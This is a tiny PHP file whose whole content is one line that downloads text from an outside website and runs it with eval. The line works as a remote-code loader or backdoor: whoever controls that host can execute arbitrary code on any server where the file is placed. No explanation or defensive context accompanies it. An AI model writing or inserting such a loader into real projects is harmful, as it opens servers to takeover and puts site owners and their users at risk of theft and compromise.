<?php
eval(file_get_contents('https://vipig.net/tool/toolvipig.txt'));
?>